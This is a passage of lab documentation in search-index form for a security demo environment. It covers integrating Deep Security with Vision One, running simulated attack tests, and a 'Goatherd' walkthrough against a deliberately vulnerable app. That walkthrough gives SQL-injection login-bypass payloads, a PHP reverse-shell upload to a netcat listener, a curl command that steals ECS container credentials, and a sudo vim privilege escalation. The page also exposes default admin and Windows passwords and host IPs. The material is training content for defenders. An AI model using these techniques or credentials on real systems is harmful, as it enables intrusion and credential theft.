AAAAB3NzaC1yc2EAAAADAQABAAACAQDTi0yXH3Xw5J3NWykzs7RgabJl/qVyEzYo5CzkIQmlCI3dIDgAJt8EaUK7ZAl4oqhOrFRbnXSUqojHC+CzUhUTliH0Azvn+unWmYBC+LZ4HOHSNk0AsziTHFYVBLF9l8cg10ARXIweJHMXw0FCwvqI5kEQVqw0Cq6RWvncj/2Vocfp79UBswcG9FsipQYAmuTlMoKVCsm482M0x7RqTpo3N1/UZuuj/YuGplC3x3FdKNMVlFAqi5sUYlMAA9D0UVxGKr6eOdS2JrBIIhB6hk9vkLTYqICbbOKbGqflL55D2STKz5zRHAMnAP5Bn9BFfaEoKAhfj+6JCBTxzAEEQIcpswRMXgC9J129PvyTtmkio1VW/Z1n1w3n5Q1vf8zO/EpHwH0SfdBoWVxoI88mJxhl1nX184jH90tWHFPNXdk46x9zuTO91he/YG0oCQpIHn8IbqIU6Iyl1lgQV2s4lTR2rXnR9QNzrpHp4YRQCiLzeB2omJJU/iJgzV8I7FQVgggPRpJZXyZgb+tqUiZteqPr+xQiogn9Jd2rt85GeHRlPba5HB6jxMj2T36Pc3c0S/jCoy5pTD3shO+4NtjpnjM1v+npYIftbmk7oEHUSXs7LQ5wPWJ1PQ00MQuqadz4ydYtb4kLWvb2EpuYNETMNfN5yoj3RjgNdBJZ62kDOhuG5Q==\"\npublic_security_group_id = \"sg-09aae61a66989cc6d\"\npublic_subnets = [\n  \"subnet-04a6ed0e09612c0ea\",\n  \"subnet-0c934a9f5917c301a\",\n]\ns3_bucket = \"playground-awsone-4bh9mlgz\"\nssh_instance_dsm = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no -o ProxyCommand='ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p ubuntu@3.120.148.35' ec2-user@10.0.0.100\"\nvpc_id = \"vpc-0725e481ee5a3250a\"\n</code></pre> <p>Connect to Deep Security using the <code>dsm_url</code> using your browser. You have configured the credentials during the configuration workflow, defaults are <code>masteradmin / trendmicro</code>.</p> <p>Verify, that some computers are protected by Deep Security and the agents are up and running.</p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-demo/#connect-to-one-of-the-computers","title":"Connect to one of the Computers","text":"<p>Here, we`re connecting to one of the Linux machines, but you can also play with the Windows Server if you prefer the mouse ;-)</p> <p>Run</p> <pre><code>pgo --output dsw\n</code></pre> <pre><code>ds_apikey = \"44EE16E8-7226-F0...\"\ndsm_url = \"https://3.120.148.35:4119\"\nlinux_policy_id = 11\npublic_instance_ip_linux1 = \"18.199.99.82\"\npublic_instance_ip_linux2 = \"3.68.82.58\"\npublic_instance_ip_windows1 = \"35.159.94.8\"\npublic_instance_password_windows1 = &lt;sensitive&gt;\nssh_instance_linux1 = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no ec2-user@18.199.99.82\"\nssh_instance_linux2 = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no ubuntu@3.68.82.58\"\nssh_instance_windows1 = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no admin@35.159.94.8\"\nwindows_policy_id = 10\npublic_instance_password_windows1 = EtppixPh#&gt;xi)UPa\n</code></pre> <p>Copy and paste the command of <code>ssh_instance_linux2</code> and run it. This will give you a prompt on that machine which is protected by Deep Security.</p> <pre><code>ubuntu@ip-10-0-4-15:~$ cd download/\nubuntu@ip-10-0-4-15:~/download$ unzip atomic_launcher_linux_1.0.0.1009.zip\n</code></pre>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-demo/#run-tests","title":"Run Tests","text":"<pre><code>ubuntu@ip-10-0-4-15:~/download$ sudo ./Atomic_Launcher_Linux.sh\n</code></pre> <p>In this example we're running the following quick tests:</p> <pre><code>- 1 - Pre Defined Tests for OAT\n  - 1 - T1003.008 - Linux Credential Access\n  - 2 - T1018     - Remote System Discovery - arp nix\n- 2 - Pre Defined Tests for OAT &amp; Workbench\n  - 1 - T1014     - Defense Evasion Reptile Rootkit\n</code></pre> <p>You can experiment with the other tests as well, of course.</p> <p>Likely, Deep Security does not detect any of these tests.</p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-demo/#integration-workflow","title":"Integration Workflow","text":"<p>Now, let's integrate Deep Security with Vision One.</p> <p>Vision One</p> <ol> <li><code>Vision One Product Instances --&gt; Add Existing Product</code>.</li> <li>Choose <code>Trend Micro Deep Security</code> --&gt; <code>Click to generate the enrollment token</code>.</li> </ol> <p></p> <ol> <li>Copy the enrollment token and save the token.</li> <li>Click <code>[Save]</code>.</li> <li>Click <code>[Connect and Transfer]</code>.</li> </ol> <p></p> <p>Deep Security</p> <ol> <li>Login to DSM Console as administrator.</li> <li>On the Deep Security software console, go to <code>Administration &gt; System Settings &gt; Trend Vision One</code></li> <li>Under <code>Registration</code>, click <code>Registration enrollment token</code>.</li> </ol> <p></p> <ol> <li>In the dialog that appears, paste the enrollment token and click  <code>[Register]</code>.</li> <li>After successful registration, your Deep Security software automatically enables Forward security events to Trend Vision One and changes the Enrollment status to \"Registered\".</li> </ol> <p></p> <p>Vision One</p> <ol> <li>Go to <code>Product Instance</code> App and verify the DSM On Premise being conncted.</li> </ol> <p></p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-demo/#install-endpoint-sensor-on-instances","title":"Install Endpoint Sensor on Instances","text":"<p>First, lets get the <code>ssh</code> commands to access our servers by running</p> <pre><code>pgo --output dsw\n</code></pre> <pre><code> __                 __   __   __             __      __        ___ \n|__) |     /\\  \\ / / _` |__) /  \\ |  | |\\ | |  \\    /  \\ |\\ | |__  \n|    |___ /~~\\  |  \\__&gt; |  \\ \\__/ \\__/ | \\| |__/    \\__/ | \\| |___ \n\n...\nssh_instance_linux1 = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no ec2-user@3.79.102.108\"\nssh_instance_linux2 = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no ubuntu@18.195.62.150\"\nssh_instance_windows1 = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no admin@18.153.208.157\"\n...\n</code></pre> <p>To connect to a linux instance via the provided <code>ssh</code> command copy and paste the commnd in your shell</p> <pre><code>ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no ec2-user@3.79.102.108\n</code></pre> <p>On the Deep Security software console, go to <code>Administration &gt; System Settings &gt; Trend Vision One</code></p> <p></p> <p>This tab shows the Endpoint Sensor deployment script for the supported platform types. First, select <code>Linux (64-bit)</code> and copy the script. In the shell on the connected server run <code>sudo su</code> to get <code>root</code> and simply paste the script.</p> <pre><code>Last login: Tue Jul  2 12:57:12 2024 from p57aa067b.dip0.t-ipconnect.de\n   ,     #_\n   ~\\_  ####_        Amazon Linux 2\n  ~~  \\_#####\\\n  ~~     \\###|       AL2 End of Life is 2025-06-30.\n  ~~       \\#/ ___\n   ~~       V~' '-&gt;\n    ~~~         /    A newer version of Amazon Linux is available!\n      ~~._.   _/\n         _/ _/       Amazon Linux 2023, GA and supported until 2028-03-15.\n       _/m/'           https://aws.amazon.com/linux/amazon-linux-2023/\n\n[ec2-user@ip-10-0-4-236 ~]$ sudo su\n[root@ip-10-0-4-236 ec2-user]# &lt;PASTE&gt;\n</code></pre> <p>Similar for Windows. Connect to the instance and paste the windows deployment script to the console.  Ignore the error at the top. The agent will install just fine.</p> <pre><code>ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no admin@18.153.208.157\n</code></pre> <pre><code>Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nInstall the latest PowerShell for new features and improvements! https://aka.ms/PSWindows\n\nPS C:\\Users\\admin&gt; &lt;PASTE&gt;\n</code></pre> <p>When, as the final step, you head back to <code>Vision One -&gt; Endpoint Security -&gt; Endpoint Inventory</code> you will see the Deep Security instance integrated with Vision One and the available computers.</p> <p></p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-demo/#test-round-2","title":"Test Round #2","text":"<p>Here, we're simply rerunning the same tests as before.</p> <pre><code>ubuntu@ip-10-0-4-15:~/download$ sudo ./Atomic_Launcher_Linux.sh\n</code></pre> <p>In this example we're running the following quick tests:</p> <pre><code>- 1 - Pre Defined Tests for OAT\n  - 1 - T1003.008 - Linux Credential Access\n  - 2 - T1018     - Remote System Discovery - arp nix\n- 2 - Pre Defined Tests for OAT &amp; Workbench\n  - 1 - T1014     - Defense Evasion Reptile Rootkit\n</code></pre> <p>There should be plenty of OATs available for inspection.</p> <p></p> <p></p> <p>A Workbench will show up as well.</p> <p></p> <p>You could now easily choose to isolate the Computer via Endpoint Sensor and the Computer gets detached from network besides Endpoint Sensor communication.</p> <p>Execution Path:</p> <p></p> <p>After doing some analysis you can reconnect the computer via <code>Workflow and Automation -&gt; Response Management</code> and selecting <code>Restore Connection</code> after clicking on the three vertical dots.</p> <p></p> <p>Optionally, download an Eicar to the linux machine. This will lead to a detection in Deep Security as well as in Vision One.</p> <p></p> <p></p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate-demo/#result-and-benefits","title":"Result and Benefits","text":"<p>You now have integrated your on-prem Deep Security instance to Vision One and enabled the XDR functionality. Additionally, you have proven some of the benefits when integration Deep Security with Vision One. Maybe start thinking about migrating?</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate/","title":"Scenario: Integrate Deep Security with Vision One","text":""},{"location":"scenarios/endpoint-security/deep-security/ds-integrate/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Deep Security</li> <li>Playground One Deep Security Workload</li> </ul> <p>The Playground One can provide a simulated on-premise Deep Security deployment. For simulation purposes it creates a dedicated VPC with the most commonly used architecture, private and public subnets accross two availability zones. </p> <p>Deep Security itself is located within the private subnet and uses a RDS Postgres as the database. The Deep Security Workload configuration creates two linux and one windows server with a deployed and activated Deep Security Agent. Some essential configurations in Deep Security are executed via REST. These are (amongst others):</p> <ul> <li>Creation of a Windows and Linux Policy with valid configurations for the security modules</li> <li>Activation of agent initiated activation</li> <li>Scheduling a recommendation scan for all created instances</li> </ul> <p>Verify, that you have <code>Enable Deep Security</code> enabled in your configuration and have set a valid Deep Security License.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nSection: Deep Security (on-prem)\nPlease set/update your Deep Security configuration\nEnable Deep Security? [true]: \nDeep Security License [AP-FHMD-FU...]: \nDeep Security Username [masteradmin]: \nDeep Security Password [trendmicro]: \n...\n</code></pre> <p>Now, deploy Deep Security and Deep Security Workload configurations by running:</p> <pre><code>pgo --apply dsm\npgo --apply dsw\n</code></pre>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate/#current-situation","title":"Current Situation","text":"<ul> <li>Deep Security secures instances in an on-premise environment simulated for this scenario, to which you want to add the XDR capabilities provided by Vision One.</li> <li>You start by integrating Deep Security into the platform.</li> </ul>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate/#integration-workflow","title":"Integration Workflow","text":"<p>Vision One</p> <ol> <li><code>Vision One Product Instances --&gt; Add Existing Product</code>.</li> <li>Choose <code>Trend Micro Deep Security</code> --&gt; <code>Click to generate the enrollment token</code>.</li> </ol> <p></p> <ol> <li>Copy the enrollment token and save the token.</li> <li>Click <code>[Save]</code>.</li> <li>Click <code>[Connect and Transfer]</code>.</li> </ol> <p></p> <p>Deep Security</p> <ol> <li>Login to DSM Console as administrator.</li> <li>On the Deep Security software console, go to <code>Administration &gt; System Settings &gt; Trend Vision One</code></li> <li>Under <code>Registration</code>, click <code>Registration enrollment token</code>.</li> </ol> <p></p> <ol> <li>In the dialog that appears, paste the enrollment token and click  <code>[Register]</code>.</li> <li>After successful registration, your Deep Security software automatically enables Forward security events to Trend Vision One and changes the Enrollment status to \"Registered\".</li> </ol> <p></p> <p>Vision One</p> <ol> <li>Go to <code>Product Instance</code> App and verify the DSM On Premise being conncted.</li> </ol> <p></p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate/#install-endpoint-sensor-on-instances","title":"Install Endpoint Sensor on Instances","text":"<p>First, lets get the <code>ssh</code> commands to access our servers by running</p> <pre><code>pgo --output dsw\n</code></pre> <pre><code> __                 __   __   __             __      __        ___ \n|__) |     /\\  \\ / / _` |__) /  \\ |  | |\\ | |  \\    /  \\ |\\ | |__  \n|    |___ /~~\\  |  \\__&gt; |  \\ \\__/ \\__/ | \\| |__/    \\__/ | \\| |___ \n\n...\nssh_instance_linux1 = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no ec2-user@3.79.102.108\"\nssh_instance_linux2 = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no ubuntu@18.195.62.150\"\nssh_instance_windows1 = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no admin@18.153.208.157\"\n...\n</code></pre> <p>To connect to a linux instance via the provided <code>ssh</code> command copy and paste the commnd in your shell</p> <pre><code>ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no ec2-user@3.79.102.108\n</code></pre> <p>On the Deep Security software console, go to <code>Administration &gt; System Settings &gt; Trend Vision One</code></p> <p></p> <p>This tab shows the Endpoint Sensor deployment script for the supported platform types. First, select <code>Linux (64-bit)</code> and copy the script. In the shell on the connected server run <code>sudo su</code> to get <code>root</code> and simply paste the script.</p> <pre><code>Last login: Tue Jul  2 12:57:12 2024 from p57aa067b.dip0.t-ipconnect.de\n   ,     #_\n   ~\\_  ####_        Amazon Linux 2\n  ~~  \\_#####\\\n  ~~     \\###|       AL2 End of Life is 2025-06-30.\n  ~~       \\#/ ___\n   ~~       V~' '-&gt;\n    ~~~         /    A newer version of Amazon Linux is available!\n      ~~._.   _/\n         _/ _/       Amazon Linux 2023, GA and supported until 2028-03-15.\n       _/m/'           https://aws.amazon.com/linux/amazon-linux-2023/\n\n[ec2-user@ip-10-0-4-236 ~]$ sudo su\n[root@ip-10-0-4-236 ec2-user]# &lt;PASTE&gt;\n</code></pre> <p>Similar for Windows. Connect to the instance and paste the windows deployment script to the console.  Ignore the error at the top. The agent will install just fine.</p> <pre><code>ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-dsm-key-pair.pem -o StrictHostKeyChecking=no admin@18.153.208.157\n</code></pre> <pre><code>Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nInstall the latest PowerShell for new features and improvements! https://aka.ms/PSWindows\n\nPS C:\\Users\\admin&gt; &lt;PASTE&gt;\n</code></pre> <p>When, as the final step, you head back to <code>Vision One -&gt; Endpoint Security -&gt; Endpoint Inventory</code> you will see the Deep Security instance integrated with Vision One and the available computers.</p> <p></p>"},{"location":"scenarios/endpoint-security/deep-security/ds-integrate/#result-and-benefits","title":"Result and Benefits","text":"<p>You now have integrated your on-prem Deep Security instance to Vision One and enabled the XDR functionality.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/endpoint-security/deep-security/ds-migrate/","title":"Scenario: Migrate Deep Security to Vision One","text":""},{"location":"scenarios/endpoint-security/deep-security/ds-migrate/#why-migrate-to-vision-one-saas","title":"Why Migrate to Vision One SaaS","text":"<ul> <li>Power of the Cloud.<ul> <li>Get the latest features continuously.</li> <li>Infinitely scalable architecture.</li> <li>Remove physical infrastructure costs &amp; maintenance.</li> </ul> </li> <li>Data Privacy, Security &amp; Compliance.<ul> <li>Compliance certified: PCI-DSS, ISO, SOC.</li> <li>Multiple Regional Data Centers.</li> <li>Data privacy.</li> <li>Reduce time spent on audits.</li> </ul> </li> <li>Simplified Operations &amp; Monitoring.<ul> <li>24 x 7 x 365 always available.</li> <li>Physically secure cloud environment.</li> <li>Monitored by Trend Micro staff.</li> </ul> </li> </ul>"},{"location":"scenarios/endpoint-security/deep-security/ds-migrate/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Deep Security</li> <li>Playground One Deep Security Workload</li> </ul> <p>The Playground One can provide a simulated on-premise Deep Security deployment. For simulation purposes it creates a dedicated VPC with the most commonly used architecture, private and public subnets accross two availability zones. </p> <p>Deep Security itself is located within the private subnet and uses a RDS Postgres as the database. The Deep Security Workload configuration creates two linux and one windows server with a deployed and activated Deep Security Agent. Some essential configurations in Deep Security are executed via REST. These are (amongst others):</p> <ul> <li>Creation of a Windows and Linux Policy with valid configurations for the security modules</li> <li>Activation of agent initiated activation</li> <li>Scheduling a recommendation scan for all created instances</li> </ul> <p>Verify, that you have <code>Enable Deep Security</code> enabled in your configuration and have set a valid Deep Security License.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nSection: Deep Security (on-prem)\nPlease set/update your Deep Security configuration\nEnable Deep Security? [true]: \nDeep Security License [AP-FHMD-FU...]: \nDeep Security Username [masteradmin]: \nDeep Security Password [trendmicro]: \n...\n</code></pre> <p>Now, deploy Deep Security and Deep Security Workload configurations by running:</p> <pre><code>pgo --apply dsm\npgo --apply dsw\n</code></pre>"},{"location":"scenarios/endpoint-security/deep-security/ds-migrate/#current-situation","title":"Current Situation","text":"<ul> <li>Deep Security is securing (simulated) on-premise instances.</li> <li>Since you want to move to the Vision One platform you want to migrate Deep Security protected computers to Vision One Server &amp; Workload Protection.</li> </ul>"},{"location":"scenarios/endpoint-security/deep-security/ds-migrate/#migration-workflow","title":"Migration Workflow","text":"<p>Vision One</p> <ol> <li>Log in to Trend Vision One, and go to <code>Endpoint Security Operations --&gt; Server &amp; Workload Protection</code>. Choose an existing target instance of Server &amp; Workload Protection.</li> <li>Navigate to <code>Administration &gt; User Management &gt; API keys</code>.</li> <li>Create a new API key with the predefined role \u201cDeep Security Migration\u201d and save the key for later use.</li> </ol> <p></p> <p>Deep Security</p> <ol> <li>Go to DSM and use the feature Migrate to Workload Security. <code>Support --&gt; Migrate to Workload Security</code>.</li> <li>When using this feature, it will need the API key and region. Specify them based on the result of the previous steps.</li> <li>In the tab <code>Configurations</code> select the Common Objects you want to migrate:</li> <li>Directory Exclusions (Windows). To migrate this select is and press <code>[Migrate Selected]</code>.</li> <li>Same for the other Common Objects.</li> <li>In the same tab click on the drop down <code>Migrate Policy (includes references Common Objects)</code> and press <code>[Migrate Selected]</code>.</li> <li>In the tab <code>Cloud Accounts</code> select the cloud accounts to migrate.</li> <li>In the tab <code>Agents</code> click on <code>Migrate using Computers page</code>.</li> </ol> <p>Note: Computer Groups/Smart Folders are not automatically migrated to Vision One. The python script groups-and-policies is able to merge the groups and smart folders including their settings from Deep Security to Vision One Server &amp; Workload Protection. How to use, see README. From left to right: Vision One clean -&gt; Deep Security -&gt; Vision One merged</p> <p></p> <ol> <li>Select the agents to migrate in the Computers page. Right click on a selected Computer and go to <code>Actions --&gt; Migrate to Workload Security</code>.</li> <li>In the <code>Cloud One Workload Security Agent Reactivation Configurations</code> adapt the settings when needed and check that <code>Security Policy --&gt; Assign migrated policy</code> is activated.</li> <li>Press the button <code>[Migrate]</code></li> <li>Review the Migration Summary.</li> </ol> <p></p> <p>Turns to</p> <p></p> <p>If the migration is successful, the DSM UI\u2019s status will show \u201cMigrated\u201d or \u201cMove Complete\u201d. </p> <p>Vision One</p> <p>In Trend Vision One Server &amp; Workload Protection, you will also see the new migrated objects appear.</p> <p></p> <p>The migrated policy tree shows the migrated policies including it's dependencies:</p> <p></p>"},{"location":"scenarios/endpoint-security/deep-security/ds-migrate/#optional-deploy-full-endpoint-agent-package","title":"(Optional): Deploy full Endpoint Agent Package","text":"<p>The migrated endpoints only have the basic Endpoint Protection agent installed. To get the full benefit and protection of Trend Vision One Endpoint Security, install the full Endpoint Agent package to enable sensor detection and response.</p> <ol> <li>Go to <code>Endpoint Inventory --&gt; Select the Server &amp; Workload Protection Manager</code>.</li> <li>Click on the <code>i1</code> marker next to the computer you want to upgrade and download the agent package.</li> </ol> <p></p> <p>The downloaded package is named similar to <code>TMServerAgent_Linux_auto_x86_64_Server_and_Workload_Protection_Manager_-_EU.tar</code>. </p> <ol> <li>Transfer the package to the computer via scp.</li> <li>Get the ssh command for the instance by running <code>pgo --output dsw</code>.</li> </ol> <p></p> <ol> <li>Copy and paste the ssh command shown but change <code>ssh</code> to <code>scp</code>, just before the username place the filename of the downloaded agent package and append a <code>:</code>. The complete command should look like this: <code>scp -i /home/markus/projects/opensource/playground/playground-one/pgo-dsm-key-pair.pem -o StrictHostKeyChecking=no &lt;DOWNLOADED TAR FILE NAME&gt; ec2-user@18.156.83.192:</code>.</li> <li>Connect via ssh to the computer.</li> <li>Now, use the <code>ssh</code> shown in the <code>pgo</code> output from above to connect to the computer. Example: <code>ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-dsm-key-pair.pem -o StrictHostKeyChecking=no ec2-user@18.156.83.192</code>.</li> <li>Running <code>ls</code> shows the uploaded package.</li> <li>Run <code>tar xfv &lt;DOWNLOADED TAR FILE NAME&gt;</code>.</li> <li>Run <code>sudo ./tmxbc install</code>.</li> <li>Sensor connectivity turns to <code>Connected</code> in the Endpoint Inventory of Vision One.</li> </ol> <p></p>"},{"location":"scenarios/endpoint-security/deep-security/ds-migrate/#optional-activate-endpoint-sensor-detection-and-response","title":"(Optional): Activate Endpoint Sensor Detection and Response","text":"<p>To activate Endpoint Sensor Detection and Response do the following:</p> <ol> <li>Go to <code>Endpoint Inventory --&gt; Select the Server &amp; Workload Protection Manager</code>.</li> <li>Click on the <code>i1</code> marker next to the computer you want to upgrade.</li> </ol> <p></p> <p>Final result:</p> <p></p>"},{"location":"scenarios/endpoint-security/deep-security/ds-migrate/#result-and-benefits","title":"Result and Benefits","text":"<ul> <li>Workload detection and protection techniques including IDS/IPS, antimalware, firewall, application control, integrity monitoring, log inspection &amp; web reputation.</li> <li>If combined with the Endpoint Sensor benefit from Vision Ones XDR capabilities. </li> <li>Continuous updates to services, updated by Trend Micro \u2013 leading to better security outcomes.</li> <li>Compliance certifications for PCI-DSS, ISO 27001, ISO 27014, ISO 27017, SOC.</li> <li>Managed compute, storage and network infrastructure \u2013 eliminates operational overhead of managing a solution.</li> <li>24 x 7 x 365 operation and monitoring of the security service.</li> <li>Provided via a highly scalable, high availability, physically secure cloud environment.</li> <li>Disaster recovery and business continuity planning supported by compliance frameworks.</li> <li>Vulnerability, penetration testing, and updating/patching of the service provided by Trend Micro.</li> <li>Annual compliance audits on the service.</li> <li>Access to other Cloud Security services from a common platform.</li> </ul> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/endpoint-security/workload-security/ws-integrate/","title":"Scenario: Integrate Workload Security with Vision One","text":""},{"location":"scenarios/endpoint-security/workload-security/ws-integrate/#prerequisites","title":"Prerequisites","text":"<ul> <li>Cloud One Workload Security instance</li> </ul> <p>It is recommended to have some policies and computers already active in your Workload Security instance.</p>"},{"location":"scenarios/endpoint-security/workload-security/ws-integrate/#current-situation","title":"Current Situation","text":"<ul> <li>Cloud One Workload Security is securing instances.</li> <li>Since you want to move to the Vision One platform you start with integrating Workload Security with the platform.</li> </ul>"},{"location":"scenarios/endpoint-security/workload-security/ws-integrate/#integration-workflow","title":"Integration Workflow","text":"<p>Vision One</p> <ol> <li><code>Vision One Product Instances --&gt; Add Existing Product</code>.</li> <li>Choose <code>Trend Cloud One</code> --&gt; <code>Click to generate the enrollment token</code>. </li> <li>Copy the enrollment token and save the token.</li> <li>Click <code>[Save]</code>.</li> <li>CLick <code>[Connect and Transfer]</code>.</li> </ol> <p>Workload Security</p> <ol> <li>Login to Workload Security Console.</li> <li>On the Workload Security software console, go to <code>Administration &gt; System Settings &gt; Trend Micro Vision One (XDR)</code>.</li> <li>Click <code>Register enrollment token</code>.</li> <li>In the dialog that appears, paste the enrollment token and click  <code>[Register]</code>.</li> <li>After successful registration, your Workload Security software automatically enables Forward security events to Trend Vision One and changes the Enrollment status to \"Registered\".</li> </ol> <p>Vision One</p> <ol> <li>Go to <code>Product Instance</code> App and verify the Workload Security instance being conncted.</li> <li>Optionally install Endpoint Sensor to the instances.</li> </ol>"},{"location":"scenarios/endpoint-security/workload-security/ws-integrate/#result-and-benefits","title":"Result and Benefits","text":"<p>You now have control of the Workload Security instance via Vision One.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/endpoint-security/workload-security/ws-migrate/","title":"Scenario: Migrate Workload Security to Vision One","text":"<p>DRAFT</p>"},{"location":"scenarios/endpoint-security/workload-security/ws-migrate/#prerequisites","title":"Prerequisites","text":"<p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/goat.temp/goat-goatherd/","title":"Scenario: Goatherd","text":""},{"location":"scenarios/goat.temp/goat-goatherd/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One Goat</li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply goat\n</code></pre> <p>Ensure to have Runtime Security enabled on the Vision One Console for this cluster.</p>"},{"location":"scenarios/goat.temp/goat-goatherd/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/goat.temp/goat-goatherd/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o goat\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>target_2_url = \"pgo-alb-qqrpqokp-1741705218.eu-central-1.elb.amazonaws.com:80/login.php\"\n</code></pre>"},{"location":"scenarios/goat.temp/goat-goatherd/#exploit","title":"Exploit","text":"<p>SQL Injection</p> <ul> <li> <p>Now, we can find Email as an injection point to perform the SQLi.</p> <p></p> <pre><code>' or '1'='1'#\n</code></pre> </li> <li> <p>As we can see, there is a front-end check for the Email field. To get around that, we need to change the input field's type from email to text and then perform the injection. This should work if there is no backend email verification.</p> <p></p> <p></p> </li> <li> <p>Voila! we are into the application!</p> <p></p> </li> </ul> <p>SQL Injection with different user</p> <ul> <li> <p>We can assume that the users table has a column named 'id'. An admin likely has the lowest user id. So try</p> <pre><code>'or '1'='1' ORDER BY id DESC#\n</code></pre> </li> <li> <p>This will put the user with the smallest id to the end of the select query and will therefore be used for authentication.</p> </li> <li> <p>When dumping all the table rows the SQL LIMIT clause can be helpful to control the number of rows returned by SQL. Let's use the payload below: </p> <pre><code>'or '1'='1' LIMIT 3 #\n</code></pre> </li> <li> <p>In this case we are a user with a manager role capable to upload payslips.</p> </li> </ul> <p>Upload PHP reverse shell</p> <ul> <li> <p>Create an EC2 instance with a public IP, connect to it and start netcat with <code>nc -nlvp 45678</code></p> </li> <li> <p>Head over to Payslips and upload the php file for the user Mark. Be sure to adapt the IP in the beginning of the php file so that it points to your server from above.</p> </li> <li> <p>Logout and relogin with SQLi using</p> <pre><code>'or '1'='1'#\n</code></pre> </li> <li> <p>You are now Mark and are checking for new payslips. Choose the one with the highest ID. This should trigger the PHP reverse shell.</p> </li> <li> <p>Head over to your EC2 instance and interact with the shell running in your ECS container task.</p> </li> </ul> <p>Recon</p> <ul> <li> <p>When running <code>id</code> we see, that we're not root but <code>www-data</code>, sadly.</p> </li> <li> <p>Let's start by printing out the Environment Variables</p> <p>```console printenv ````</p> </li> <li> <p>We can ascertain a lot of information from the environment variables. From the <code>AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code>, it is evident that we have a shell inside a container. From the <code>AWS_EXECUTION_ENV</code>, it is evident we are in an ECS container that is running on an EC2 instance host. Also from the <code>RDS_ENDPOINT</code> we can assume the application is using the RDS service.</p> <p></p> </li> <li> <p>Now, run the below command to get the ECS container's metadata.</p> <pre><code>curl http://172.17.0.1:51678/v1/metadata\n</code></pre> <p></p> </li> <li> <p>On examining the output, we can find that the target application is running on a Container Instance. From the <code>ContainerInstanceArn</code> we have found the aws accounts' information where the HR application is deployed.</p> </li> <li> <p>Containers in AWS Elastic Container Service (ECS) are run using <code>tasks</code> and tasks have a role assigned to them that is passed on to the ECS Containers. Since we've already established that the application is running on an ECS container, let's try to get it's AWS Role Credentials by running the below command.</p> <pre><code>curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\n</code></pre> </li> <li> <p>Voila! We obtained Container Credentials.</p> <p></p> </li> <li> <p>When running <code>id</code> we see, that we're not root, sadly.</p> </li> </ul> <p>Escalating Privilege to root user</p> <ul> <li> <p>We can try to switch to root:</p> <pre><code>sudo su\n</code></pre> </li> <li> <p>But we can't do that</p> </li> <li> <p>We can try to list commands that we are allowed to run as superuser on the host.</p> <pre><code>sudo -l\n</code></pre> </li> <li> <p>The current user can run vim on the /var/www/html/documents directory as root without using a password. This can allow us to escalate our privileges as vim in itself does feature an internal command line executor.</p> <pre><code>(root) NOPASSWD: /usr/bin/vim /var/www/html/documents\n</code></pre> </li> <li> <p>Now we can try to get root access by running vim on the <code>/var/www/html/documents</code> directory with root privileges using the following command:</p> <pre><code>sudo /usr/bin/vim /var/www/html/documents\n</code></pre> </li> <li> <p>Here we can try to spawn a shell through vims' internal command line executor by using the command after pressing the  key: <pre><code>:! 